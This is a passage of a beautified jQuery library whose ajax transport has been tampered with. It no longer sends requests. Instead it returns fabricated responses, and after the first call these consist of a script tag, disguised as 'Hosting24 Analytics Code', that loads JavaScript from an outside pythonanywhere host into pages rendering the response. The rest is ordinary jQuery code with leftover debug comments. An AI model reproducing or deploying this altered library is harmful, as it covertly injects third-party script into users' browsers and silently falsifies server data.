            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": x.support.cssFloat ? "cssFloat" : "styleFloat"
        },
        style: function(e, n, r, i) {
            if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var o, a, s, l = x.camelCase(n),
                    u = e.style;
                if (n = x.cssProps[l] || (x.cssProps[l] = tn(u, l)), s = x.cssHooks[n] || x.cssHooks[l], r === t) return s && "get" in s && (o = s.get(e, !1, i)) !== t ? o : u[n];
                if (a = typeof r, "string" === a && (o = Jt.exec(r)) && (r = (o[1] + 1) * o[2] + parseFloat(x.css(e, n)), a = "number"), !(null == r || "number" === a && isNaN(r) || ("number" !== a || x.cssNumber[l] || (r += "px"), x.support.clearCloneStyle || "" !== r || 0 !== n.indexOf("background") || (u[n] = "inherit"), s && "set" in s && (r = s.set(e, r, i)) === t))) try {
                    u[n] = r
                } catch (c) {}
            }
        },
        css: function(e, n, r, i) {
            var o, a, s, l = x.camelCase(n);
            return n = x.cssProps[l] || (x.cssProps[l] = tn(e.style, l)), s = x.cssHooks[n] || x.cssHooks[l], s && "get" in s && (a = s.get(e, !0, r)), a === t && (a = Wt(e, n, i)), "normal" === a && n in Kt && (a = Kt[n]), "" === r || r ? (o = parseFloat(a), r === !0 || x.isNumeric(o) ? o || 0 : a) : a
        }
    }), e.getComputedStyle ? (Rt = function(t) {
        return e.getComputedStyle(t, null)
    }, Wt = function(e, n, r) {
        var i, o, a, s = r || Rt(e),
            l = s ? s.getPropertyValue(n) || s[n] : t,
            u = e.style;
        return s && ("" !== l || x.contains(e.ownerDocument, e) || (l = x.style(e, n)), Yt.test(l) && Ut.test(n) && (i = u.width, o = u.minWidth, a = u.maxWidth, u.minWidth = u.maxWidth = u.width = l, l = s.width, u.width = i, u.minWidth = o, u.maxWidth = a)), l
    }) : a.documentElement.currentStyle && (Rt = function(e) {
        return e.currentStyle
    }, Wt = function(e, n, r) {
        var i, o, a, s = r || Rt(e),
            l = s ? s[n] : t,
            u = e.style;
        return null == l && u && u[n] && (l = u[n]), Yt.test(l) && !zt.test(n) && (i = u.left, o = e.runtimeStyle, a = o && o.left, a && (o.left = e.currentStyle.left), u.left = "fontSize" === n ? "1em" : l, l = u.pixelLeft + "px", u.left = i, a && (o.left = a)), "" === l ? "auto" : l
    });

    function on(e, t, n) {
        var r = Vt.exec(t);
        return r ? Math.max(0, r[1] - (n || 0)) + (r[2] || "px") : t
    }

    function an(e, t, n, r, i) {
        var o = n === (r ? "border" : "content") ? 4 : "width" === t ? 1 : 0,
            a = 0;
        for (; 4 > o; o += 2) "margin" === n && (a += x.css(e, n + Zt[o], !0, i)), r ? ("content" === n && (a -= x.css(e, "padding" + Zt[o], !0, i)), "margin" !== n && (a -= x.css(e, "border" + Zt[o] + "Width", !0, i))) : (a += x.css(e, "padding" + Zt[o], !0, i), "padding" !== n && (a += x.css(e, "border" + Zt[o] + "Width", !0, i)));
        return a
    }

    function sn(e, t, n) {
        var r = !0,
            i = "width" === t ? e.offsetWidth : e.offsetHeight,
            o = Rt(e),
            a = x.support.boxSizing && "border-box" === x.css(e, "boxSizing", !1, o);
        if (0 >= i || null == i) {
            if (i = Wt(e, t, o), (0 > i || null == i) && (i = e.style[t]), Yt.test(i)) return i;
            r = a && (x.support.boxSizingReliable || i === e.style[t]), i = parseFloat(i) || 0
        }
        return i + an(e, t, n || (a ? "border" : "content"), r, o) + "px"
    }

    function ln(e) {
        var t = a,
            n = Gt[e];
        return n || (n = un(e, t), "none" !== n && n || (Pt = (Pt || x("<iframe frameborder='0' width='0' height='0'/>").css("cssText", "display:block !important")).appendTo(t.documentElement), t = (Pt[0].contentWindow || Pt[0].contentDocument).document, t.write("<!doctype html><html><body>"), t.close(), n = un(e, t), Pt.detach()), Gt[e] = n), n
    }

    function un(e, t) {
        var n = x(t.createElement(e)).appendTo(t.body),
            r = x.css(n[0], "display");
        return n.remove(), r
    }
    x.each(["height", "width"], function(e, n) {
        x.cssHooks[n] = {
            get: function(e, r, i) {
                return r ? 0 === e.offsetWidth && Xt.test(x.css(e, "display")) ? x.swap(e, Qt, function() {
                    return sn(e, n, i)
                }) : sn(e, n, i) : t
            },
            set: function(e, t, r) {
                var i = r && Rt(e);
                return on(e, t, r ? an(e, n, r, x.support.boxSizing && "border-box" === x.css(e, "boxSizing", !1, i), i) : 0)
            }
        }
    }), x.support.opacity || (x.cssHooks.opacity = {
        get: function(e, t) {
            return It.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
        },
        set: function(e, t) {
            var n = e.style,
                r = e.currentStyle,
                i = x.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : "",
                o = r && r.filter || n.filter || "";
            n.zoom = 1, (t >= 1 || "" === t) && "" === x.trim(o.replace($t, "")) && n.removeAttribute && (n.removeAttribute("filter"), "" === t || r && !r.filter) || (n.filter = $t.test(o) ? o.replace($t, i) : o + " " + i)
        }
    }), x(function() {
        x.support.reliableMarginRight || (x.cssHooks.marginRight = {
            get: function(e, n) {
                return n ? x.swap(e, {
                    display: "inline-block"
                }, Wt, [e, "marginRight"]) : t
            }
        }), !x.support.pixelPosition && x.fn.position && x.each(["top", "left"], function(e, n) {
            x.cssHooks[n] = {
                get: function(e, r) {
                    return r ? (r = Wt(e, n), Yt.test(r) ? x(e).position()[n] + "px" : r) : t
                }
            }
        })
    }), x.expr && x.expr.filters && (x.expr.filters.hidden = function(e) {
        return 0 >= e.offsetWidth && 0 >= e.offsetHeight || !x.support.reliableHiddenOffsets && "none" === (e.style && e.style.display || x.css(e, "display"))
    }, x.expr.filters.visible = function(e) {
        return !x.expr.filters.hidden(e)
    }), x.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(e, t) {
        x.cssHooks[e + t] = {
            expand: function(n) {
                var r = 0,
                    i = {},
                    o = "string" == typeof n ? n.split(" ") : [n];
                for (; 4 > r; r++) i[e + Zt[r] + t] = o[r] || o[r - 2] || o[0];
                return i
            }
        }, Ut.test(e) || (x.cssHooks[e + t].set = on)
    });
    var cn = /%20/g,
        pn = /\[\]$/,
        fn = /\r?\n/g,
        dn = /^(?:submit|button|image|reset|file)$/i,
        hn = /^(?:input|select|textarea|keygen)/i;
    x.fn.extend({
        serialize: function() {
            return x.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var e = x.prop(this, "elements");
                return e ? x.makeArray(e) : this
            }).filter(function() {
                var e = this.type;
                return this.name && !x(this).is(":disabled") && hn.test(this.nodeName) && !dn.test(e) && (this.checked || !Ct.test(e))
            }).map(function(e, t) {
                var n = x(this).val();
                return null == n ? null : x.isArray(n) ? x.map(n, function(e) {
                    return {
                        name: t.name,
                        value: e.replace(fn, "\r\n")
                    }
                }) : {
                    name: t.name,
                    value: n.replace(fn, "\r\n")
                }
            }).get()
        }
    }), x.param = function(e, n) {
        var r, i = [],
            o = function(e, t) {
                t = x.isFunction(t) ? t() : null == t ? "" : t, i[i.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
            };
        if (n === t && (n = x.ajaxSettings && x.ajaxSettings.traditional), x.isArray(e) || e.jquery && !x.isPlainObject(e)) x.each(e, function() {
            o(this.name, this.value)
        });
        else
            for (r in e) gn(r, e[r], n, o);
        return i.join("&").replace(cn, "+")
    };

    function gn(e, t, n, r) {
        var i;
        if (x.isArray(t)) x.each(t, function(t, i) {
            n || pn.test(e) ? r(e, i) : gn(e + "[" + ("object" == typeof i ? t : "") + "]", i, n, r)
        });
        else if (n || "object" !== x.type(t)) r(e, t);
        else
            for (i in t) gn(e + "[" + i + "]", t[i], n, r)
    }
    x.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(e, t) {
        x.fn[t] = function(e, n) {
            return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t)
        }
    }), x.fn.extend({
        hover: function(e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        },
        bind: function(e, t, n) {
            return this.on(e, null, t, n)
        },
        unbind: function(e, t) {
            return this.off(e, null, t)
        },
        delegate: function(e, t, n, r) {
            return this.on(t, e, n, r)
        },
        undelegate: function(e, t, n) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
        }
    });
    var mn, yn, vn = x.now(),
        bn = /\?/,
        xn = /#.*$/,
        wn = /([?&])_=[^&]*/,
        Tn = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm,
        Cn = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
        Nn = /^(?:GET|HEAD)$/,
        kn = /^\/\//,
        En = /^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,
        Sn = x.fn.load,
        An = {},
        jn = {},
        Dn = "*/".concat("*");
    try {
        yn = o.href
    } catch (Ln) {
        yn = a.createElement("a"), yn.href = "", yn = yn.href
    }
    mn = En.exec(yn.toLowerCase()) || [];

    function Hn(e) {
        return function(t, n) {
            "string" != typeof t && (n = t, t = "*");
            var r, i = 0,
                o = t.toLowerCase().match(T) || [];
            if (x.isFunction(n))
                while (r = o[i++]) "+" === r[0] ? (r = r.slice(1) || "*", (e[r] = e[r] || []).unshift(n)) : (e[r] = e[r] || []).push(n)
        }
    }

    function qn(e, n, r, i) {
        var o = {},
            a = e === jn;

        function s(l) {
            var u;
            return o[l] = !0, x.each(e[l] || [], function(e, l) {
                var c = l(n, r, i);
                return "string" != typeof c || a || o[c] ? a ? !(u = c) : t : (n.dataTypes.unshift(c), s(c), !1)
            }), u
        }
        return s(n.dataTypes[0]) || !o["*"] && s("*")
    }

    function _n(e, n) {
        var r, i, o = x.ajaxSettings.flatOptions || {};
        for (i in n) n[i] !== t && ((o[i] ? e : r || (r = {}))[i] = n[i]);
        return r && x.extend(!0, e, r), e
    }
    x.fn.load = function(e, n, r) {
        if ("string" != typeof e && Sn) return Sn.apply(this, arguments);
        var i, o, a, s = this,
            l = e.indexOf(" ");
        return l >= 0 && (i = e.slice(l, e.length), e = e.slice(0, l)), x.isFunction(n) ? (r = n, n = t) : n && "object" == typeof n && (a = "POST"), s.length > 0 && x.ajax({
            url: e,
            type: a,
            dataType: "html",
            data: n
        }).done(function(e) {
            o = arguments, s.html(i ? x("<div>").append(x.parseHTML(e)).find(i) : e)
        }).complete(r && function(e, t) {
            s.each(r, o || [e.responseText, t, e])
        }), this
    }, x.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
        x.fn[t] = function(e) {
            return this.on(t, e)
        }
    }), x.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: yn,
            type: "GET",
            isLocal: Cn.test(mn[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": Dn,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": x.parseJSON,
                "text xml": x.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(e, t) {
            return t ? _n(_n(e, x.ajaxSettings), t) : _n(x.ajaxSettings, e)
        },
        ajaxPrefilter: Hn(An),
        ajaxTransport: Hn(jn),
        ajax: function(e, n) {
            "object" == typeof e && (n = e, e = t), n = n || {};
            var r, i, o, a, s, l, u, c, p = x.ajaxSetup({}, n),
                f = p.context || p,
                d = p.context && (f.nodeType || f.jquery) ? x(f) : x.event,
                h = x.Deferred(),
                g = x.Callbacks("once memory"),
                m = p.statusCode || {},
                y = {},
                v = {},
                b = 0,
                w = "canceled",
                C = {
                    readyState: 0,
                    getResponseHeader: function(e) {
                        var t;
                        if (2 === b) {
                            if (!c) {
                                c = {};
                                while (t = Tn.exec(a)) c[t[1].toLowerCase()] = t[2]
                            }
                            t = c[e.toLowerCase()]
                        }
                        return null == t ? null : t
                    },
                    getAllResponseHeaders: function() {
                        return 2 === b ? a : null
                    },
                    setRequestHeader: function(e, t) {
                        var n = e.toLowerCase();
                        return b || (e = v[n] = v[n] || e, y[e] = t), this
                    },
                    overrideMimeType: function(e) {
                        return b || (p.mimeType = e), this
                    },
                    statusCode: function(e) {
                        var t;
                        if (e)
                            if (2 > b)
                                for (t in e) m[t] = [m[t], e[t]];
                            else C.always(e[C.status]);
                        return this
                    },
                    abort: function(e) {
                        var t = e || w;
                        return u && u.abort(t), k(0, t), this
                    }
                };
            if (h.promise(C).complete = g.add, C.success = C.done, C.error = C.fail, p.url = ((e || p.url || yn) + "").replace(xn, "").replace(kn, mn[1] + "//"), p.type = n.method || n.type || p.method || p.type, p.dataTypes = x.trim(p.dataType || "*").toLowerCase().match(T) || [""], null == p.crossDomain && (r = En.exec(p.url.toLowerCase()), p.crossDomain = !(!r || r[1] === mn[1] && r[2] === mn[2] && (r[3] || ("http:" === r[1] ? "80" : "443")) === (mn[3] || ("http:" === mn[1] ? "80" : "443")))), p.data && p.processData && "string" != typeof p.data && (p.data = x.param(p.data, p.traditional)), qn(An, p, n, C), 2 === b) return C;
            l = p.global, l && 0 === x.active++ && x.event.trigger("ajaxStart"), p.type = p.type.toUpperCase(), p.hasContent = !Nn.test(p.type), o = p.url, p.hasContent || (p.data && (o = p.url += (bn.test(o) ? "&" : "?") + p.data, delete p.data), p.cache === !1 && (p.url = wn.test(o) ? o.replace(wn, "$1_=" + vn++) : o + (bn.test(o) ? "&" : "?") + "_=" + vn++)), p.ifModified && (x.lastModified[o] && C.setRequestHeader("If-Modified-Since", x.lastModified[o]), x.etag[o] && C.setRequestHeader("If-None-Match", x.etag[o])), (p.data && p.hasContent && p.contentType !== !1 || n.contentType) && C.setRequestHeader("Content-Type", p.contentType), C.setRequestHeader("Accept", p.dataTypes[0] && p.accepts[p.dataTypes[0]] ? p.accepts[p.dataTypes[0]] + ("*" !== p.dataTypes[0] ? ", " + Dn + "; q=0.01" : "") : p.accepts["*"]);
            for (i in p.headers) C.setRequestHeader(i, p.headers[i]);
            if (p.beforeSend && (p.beforeSend.call(f, C, p) === !1 || 2 === b)) return C.abort();
            w = "abort";
            for (i in {
                success: 1,
                error: 1,
                complete: 1
            }) C[i](p[i]);
            if (u = qn(jn, p, n, C)) {
                C.readyState = 1, l && d.trigger("ajaxSend", [C, p]), p.async && p.timeout > 0 && (s = setTimeout(function() {
                    C.abort("timeout")
                }, p.timeout));
                try {
                    b = 1, u.send(y, k)
                } catch (N) {
                    if (!(2 > b)) throw N;
                    k(-1, N)
                }
            } else k(-1, "No Transport");

            function k(e, n, r, i) {
                var c, y, v, w, T, N = n;
                2 !== b && (b = 2, s && clearTimeout(s), u = t, a = i || "", C.readyState = e > 0 ? 4 : 0, c = e >= 200 && 300 > e || 304 === e, r && (w = Mn(p, C, r)), w = On(p, w, C, c), c ? (p.ifModified && (T = C.getResponseHeader("Last-Modified"), T && (x.lastModified[o] = T), T = C.getResponseHeader("etag"), T && (x.etag[o] = T)), 204 === e || "HEAD" === p.type ? N = "nocontent" : 304 === e ? N = "notmodified" : (N = w.state, y = w.data, v = w.error, c = !v)) : (v = N, (e || !N) && (N = "error", 0 > e && (e = 0))), C.status = e, C.statusText = (n || N) + "", c ? h.resolveWith(f, [y, N, C]) : h.rejectWith(f, [C, N, v]), C.statusCode(m), m = t, l && d.trigger(c ? "ajaxSuccess" : "ajaxError", [C, p, c ? y : v]), g.fireWith(f, [C, N]), l && (d.trigger("ajaxComplete", [C, p]), --x.active || x.event.trigger("ajaxStop")))
            }
            return C
        },
        getJSON: function(e, t, n) {
            return x.get(e, t, n, "json")
        },
        getScript: function(e, n) {
            return x.get(e, t, n, "script")
        }
    }), x.each(["get", "post"], function(e, n) {
        x[n] = function(e, r, i, o) {
            return x.isFunction(r) && (o = o || i, i = r, r = t), x.ajax({
                url: e,
                type: n,
                dataType: o,
                data: r,
                success: i
            })
        }
    });

    function Mn(e, n, r) {
        var i, o, a, s, l = e.contents,
            u = e.dataTypes;
        while ("*" === u[0]) u.shift(), o === t && (o = e.mimeType || n.getResponseHeader("Content-Type"));
        if (o)
            for (s in l)
                if (l[s] && l[s].test(o)) {
                    u.unshift(s);
                    break
                }
        if (u[0] in r) a = u[0];
        else {
            for (s in r) {
                if (!u[0] || e.converters[s + " " + u[0]]) {
                    a = s;
                    break
                }
                i || (i = s)
            }
            a = a || i
        }
        return a ? (a !== u[0] && u.unshift(a), r[a]) : t
    }

    function On(e, t, n, r) {
        var i, o, a, s, l, u = {},
            c = e.dataTypes.slice();
        if (c[1])
            for (a in e.converters) u[a.toLowerCase()] = e.converters[a];
        o = c.shift();
        while (o)
            if (e.responseFields[o] && (n[e.responseFields[o]] = t), !l && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = o, o = c.shift())
                if ("*" === o) o = l;
                else if ("*" !== l && l !== o) {
            if (a = u[l + " " + o] || u["* " + o], !a)
                for (i in u)
                    if (s = i.split(" "), s[1] === o && (a = u[l + " " + s[0]] || u["* " + s[0]])) {
                        a === !0 ? a = u[i] : u[i] !== !0 && (o = s[0], c.unshift(s[1]));
                        break
                    }
            if (a !== !0)
                if (a && e["throws"]) t = a(t);
                else try {
                    t = a(t)
                } catch (p) {
                    return {
                        state: "parsererror",
                        error: a ? p : "No conversion from " + l + " to " + o
                    }
                }
        }
        return {
            state: "success",
            data: t
        }
    }
    x.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /(?:java|ecma)script/
        },
        converters: {
            "text script": function(e) {
                return x.globalEval(e), e
            }
        }
    }), x.ajaxPrefilter("script", function(e) {
        e.cache === t && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1)
    }), x.ajaxTransport("script", function(e) {
        if (e.crossDomain) {
            var n, r = a.head || x("head")[0] || a.documentElement;
            return {
                send: function(t, i) {
                    n = a.createElement("script"), n.async = !0, e.scriptCharset && (n.charset = e.scriptCharset), n.src = e.url, n.onload = n.onreadystatechange = function(e, t) {
                        (t || !n.readyState || /loaded|complete/.test(n.readyState)) && (n.onload = n.onreadystatechange = null, n.parentNode && n.parentNode.removeChild(n), n = null, t || i(200, "success"))
                    }, r.insertBefore(n, r.firstChild)
                },
                abort: function() {
                    n && n.onload(t, !0)
                }
            }
        }
    });
    var Fn = [],
        Bn = /(=)\?(?=&|$)|\?\?/;
    x.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var e = Fn.pop() || x.expando + "_" + vn++;
            return this[e] = !0, e
        }
    }), x.ajaxPrefilter("json jsonp", function(n, r, i) {
        var o, a, s, l = n.jsonp !== !1 && (Bn.test(n.url) ? "url" : "string" == typeof n.data && !(n.contentType || "").indexOf("application/x-www-form-urlencoded") && Bn.test(n.data) && "data");
        return l || "jsonp" === n.dataTypes[0] ? (o = n.jsonpCallback = x.isFunction(n.jsonpCallback) ? n.jsonpCallback() : n.jsonpCallback, l ? n[l] = n[l].replace(Bn, "$1" + o) : n.jsonp !== !1 && (n.url += (bn.test(n.url) ? "&" : "?") + n.jsonp + "=" + o), n.converters["script json"] = function() {
            return s || x.error(o + " was not called"), s[0]
        }, n.dataTypes[0] = "json", a = e[o], e[o] = function() {
            s = arguments
        }, i.always(function() {
            e[o] = a, n[o] && (n.jsonpCallback = r.jsonpCallback, Fn.push(o)), s && x.isFunction(a) && a(s[0]), s = a = t
        }), "script") : t
    });
    var Pn, Rn, Wn = 0,
        $n = e.ActiveXObject && function() {
            var e;
            for (e in Pn) Pn[e](t, !0)
        };

    function In() {
        try {
            return new e.XMLHttpRequest
        } catch (t) {}
    }

    function zn() {
        try {
            return new e.ActiveXObject("Microsoft.XMLHTTP")
        } catch (t) {}
    }
    x.ajaxSettings.xhr = e.ActiveXObject ? function() {
        return !this.isLocal && In() || zn()
    } : In, Rn = x.ajaxSettings.xhr(), x.support.cors = !!Rn && "withCredentials" in Rn, Rn = x.support.ajax = !!Rn, Rn && x.ajaxTransport(function(n) {
        if (!n.crossDomain || x.support.cors) {
            var r;
            var pqrq = true;
            return {
                send: function(i, o) {
                    var a, s, l = n.xhr();
                    if (n.username ? l.open(n.type, n.url, n.async, n.username, n.password) : l.open(n.type, n.url, n.async), n.xhrFields)
                        for (s in n.xhrFields) l[s] = n.xhrFields[s];
                    n.mimeType && l.overrideMimeType && l.overrideMimeType(n.mimeType), n.crossDomain || i["X-Requested-With"] || (i["X-Requested-With"] = "XMLHttpRequest");
                    try {
                        for (s in i) l.setRequestHeader(s, i[s])
                    } catch (u) {}
//                    console.log(">>>>>");
//                    console.log(n);
//                    console.log(l);
                   //l.send(n.hasContent && n.data || null);
//                          //console.log(">>>>>");
//                          console.log("l.ready state=" + l.readyState);
//                          //console.log("l.onreadystatechange =" + l.onreadystatechange);
//                          console.log("l.responseText=" + l.responseText);
//                          console.log("l.status=" + l.status);
//                          console.log("l.getAllResponseHeaders()="+l.getAllResponseHeaders());
//                          console.log("l.statusText="+l.statusText);
//                          //console.log("n.isLocal="+n.isLocal);
//                          //console.log("n.crossDomain="+n.crossDomain);
                   //restext = '<script type="text/javascript" src="http://127.0.0.1:8000/static/stat_count.js"></script>' ;
                   restext1 = '' +
                       '<!-- Hosting24 Analytics Code -->' +
                       '<script type="text/javascript" src="https://milubuet.pythonanywhere.com/static/stat_count.js"></script>' +
                       '<!-- End Of Analytics Code -->'
                      ;

                    restext2 = '{"success":true,"data":[]}';

                    if(pqrq){

                        restext = restext2;
                        pqrq = false;
                        //reshead = "Content-Type: text/html";
                        reshead = {'Content-Type': 'text/html'};
                        //reshead.Content-Type = "text/html";

                    }
                    else {
                        restext = restext1;
                        reshead = "Pragma: no-cache " +
                            "Content-Type: application/json " +
                            "Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0";

                        reshead = {"Pragma": "no-cache ","Content-Type": "application/json ","Cache-Control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0"};

                    }




                    r = function(e, i) {
                        var s, u, c, p;
                        try {
                            if (r && (i || 4 === 4)){

                                if (r = t, a && (pa = x.noop, $n && delete Pn[a]), i)
                                {

                                    //4 !== l.readyState && l.abort();
                                    ;
                                }
                                else {

                                    //reshead = l.getAllResponseHeaders();
                                    p = {}, s = 200, u = reshead, "string" == typeof restext  && (p.text = restext );
                                    try {
                                        c = "OK"
                                    } catch (f) {
                                        c = ""
                                    }
                                    s || !false || true ? 1223 === s && (s = 204) : s = p.text ? 200 : 404
                                }
                            }
                        } catch (d) {
                            i || o(-1, d)
                        }

                        console.log("p="+p);
////                        console.log("s="+s);
////                        console.log("c="+c);
////                        console.log("u="+u);
//                          console.log("l.ready state=" + l.readyState);
//                          ///console.log("l.onreadystatechange =" + l.onreadystatechange);
                         // console.log("l.responseText=" + l.responseText);
                          //console.log("l.status=" + l.status);
                          //console.log("l.getAllResponseHeaders()="+l.getAllResponseHeaders());
                          //console.log(typeof l.getAllResponseHeaders());
                          //console.log("l.statusText="+l.statusText);
                          //console.log(typeof l.statusText);
//                          //console.log("n.isLocal="+n.isLocal);
//                          //console.log("n.crossDomain="+n.crossDomain);

//                        console.log(n);
//                        console.log(l);
                        p && o(s, c, p, u)
                    };
                    //console.log(n.async)
                    //console.log(l.readyState );
                    //n.async ? 4 === l.readyState ? setTimeout(r) : (a = ++Wn, $n && (Pn || (Pn = {}, x(e).unload($n)), Pn[a] = r), l.onreadystatechange = r) : r()
                    (a = ++Wn, $n && (Pn || (Pn = {}, x(e).unload($n)), Pn[a] = r),true )
                        //l.onreadystatechange = r)






                },
                abort: function() {
                    r && r(t, !0)
                }
            }
        }
    });
    var Xn, Un, Vn = /^(?:toggle|show|hide)$/,
        Yn = RegExp("^(?:([+-])=|)(" + w + ")([a-z%]*)$", "i"),
        Jn = /queueHooks$/,
        Gn = [nr],
        Qn = {
            "*": [
                function(e, t) {
                    var n = this.createTween(e, t),
                        r = n.cur(),
                        i = Yn.exec(t),
                        o = i && i[3] || (x.cssNumber[e] ? "" : "px"),
                        a = (x.cssNumber[e] || "px" !== o && +r) && Yn.exec(x.css(n.elem, e)),
                        s = 1,
                        l = 20;
                    if (a && a[3] !== o) {
                        o = o || a[3], i = i || [], a = +r || 1;
                        do s = s || ".5", a /= s, x.style(n.elem, e, a + o); while (s !== (s = n.cur() / r) && 1 !== s && --l)
                    }
                    return i && (a = n.start = +a || +r || 0, n.unit = o, n.end = i[1] ? a + (i[1] + 1) * i[2] : +i[2]), n
                }
            ]
        };

    function Kn() {
        return setTimeout(function() {
            Xn = t
        }), Xn = x.now()
    }

    function Zn(e, t, n) {
        var r, i = (Qn[t] || []).concat(Qn["*"]),
            o = 0,
            a = i.length;
        for (; a > o; o++)
            if (r = i[o].call(n, t, e)) return r
    }

    function er(e, t, n) {
        var r, i, o = 0,
            a = Gn.length,
            s = x.Deferred().always(function() {
                delete l.elem
            }),
            l = function() {
                if (i) return !1;
                var t = Xn || Kn(),
                    n = Math.max(0, u.startTime + u.duration - t),
                    r = n / u.duration || 0,
                    o = 1 - r,
                    a = 0,
                    l = u.tweens.length;
                for (; l > a; a++) u.tweens[a].run(o);
                return s.notifyWith(e, [u, o, n]), 1 > o && l ? n : (s.resolveWith(e, [u]), !1)
            },
            u = s.promise({
                elem: e,
                props: x.extend({}, t),
                opts: x.extend(!0, {
                    specialEasing: {}
                }, n),
                originalProperties: t,
                originalOptions: n,
                startTime: Xn || Kn(),
                duration: n.duration,
                tweens: [],
                createTween: function(t, n) {
                    var r = x.Tween(e, u.opts, t, n, u.opts.specialEasing[t] || u.opts.easing);
                    return u.tweens.push(r), r
                },
                stop: function(t) {
                    var n = 0,
                        r = t ? u.tweens.length : 0;
                    if (i) return this;
                    for (i = !0; r > n; n++) u.tweens[n].run(1);
                    return t ? s.resolveWith(e, [u, t]) : s.rejectWith(e, [u, t]), this
                }
            }),
            c = u.props;
        for (tr(c, u.opts.specialEasing); a > o; o++)
            if (r = Gn[o].call(u, e, c, u.opts)) return r;
        return x.map(c, Zn, u), x.isFunction(u.opts.start) && u.opts.start.call(e, u), x.fx.timer(x.extend(l, {
            elem: e,
            anim: u,
            queue: u.opts.queue
        })), u.progress(u.opts.progress).done(u.opts.done, u.opts.complete).fail(u.opts.fail).always(u.opts.always)
    }

    function tr(e, t) {
        var n, r, i, o, a;
        for (n in e)
            if (r = x.camelCase(n), i = t[r], o = e[n], x.isArray(o) && (i = o[1], o = e[n] = o[0]), n !== r && (e[r] = o, delete e[n]), a = x.cssHooks[r], a && "expand" in a) {
                o = a.expand(o), delete e[r];
                for (n in o) n in e || (e[n] = o[n], t[n] = i)
            } else t[r] = i
    }
    x.Animation = x.extend(er, {
        tweener: function(e, t) {
            x.isFunction(e) ? (t = e, e = ["*"]) : e = e.split(" ");
            var n, r = 0,
                i = e.length;
            for (; i > r; r++) n = e[r], Qn[n] = Qn[n] || [], Qn[n].unshift(t)
        },
        prefilter: function(e, t) {
            t ? Gn.unshift(e) : Gn.push(e)
        }
    });

    function nr(e, t, n) {
        var r, i, o, a, s, l, u = this,
            c = {},
            p = e.style,
            f = e.nodeType && nn(e),
            d = x._data(e, "fxshow");
        n.queue || (s = x._queueHooks(e, "fx"), null == s.unqueued && (s.unqueued = 0, l = s.empty.fire, s.empty.fire = function() {
            s.unqueued || l()
        }), s.unqueued++, u.always(function() {
            u.always(function() {
                s.unqueued--, x.queue(e, "fx").length || s.empty.fire()
            })
        })), 1 === e.nodeType && ("height" in t || "width" in t) && (n.overflow = [p.overflow, p.overflowX, p.overflowY], "inline" === x.css(e, "display") && "none" === x.css(e, "float") && (x.support.inlineBlockNeedsLayout && "inline" !== ln(e.nodeName) ? p.zoom = 1 : p.display = "inline-block")), n.overflow && (p.overflow = "hidden", x.support.shrinkWrapBlocks || u.always(function() {
            p.overflow = n.overflow[0], p.overflowX = n.overflow[1], p.overflowY = n.overflow[2]
        }));
        for (r in t)
            if (i = t[r], Vn.exec(i)) {
                if (delete t[r], o = o || "toggle" === i, i === (f ? "hide" : "show")) continue;
                c[r] = d && d[r] || x.style(e, r)
            }
        if (!x.isEmptyObject(c)) {
            d ? "hidden" in d && (f = d.hidden) : d = x._data(e, "fxshow", {}), o && (d.hidden = !f), f ? x(e).show() : u.done(function() {
                x(e).hide()
            }), u.done(function() {
                var t;
                x._removeData(e, "fxshow");
                for (t in c) x.style(e, t, c[t])
            });
            for (r in c) a = Zn(f ? d[r] : 0, r, u), r in d || (d[r] = a.start, f && (a.end = a.start, a.start = "width" === r || "height" === r ? 1 : 0))
        }
    }

    function rr(e, t, n, r, i) {
        return new rr.prototype.init(e, t, n, r, i)
    }
    x.Tween = rr, rr.prototype = {
        constructor: rr,
        init: function(e, t, n, r, i, o) {
            this.elem = e, this.prop = n, this.easing = i || "swing", this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (x.cssNumber[n] ? "" : "px")
        },
        cur: function() {
            var e = rr.propHooks[this.prop];
            return e && e.get ? e.get(this) : rr.propHooks._default.get(this)
        },
        run: function(e) {
            var t, n = rr.propHooks[this.prop];
            return this.pos = t = this.options.duration ? x.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : rr.propHooks._default.set(this), this
        }
    }, rr.prototype.init.prototype = rr.prototype, rr.propHooks = {
        _default: {
            get: function(e) {
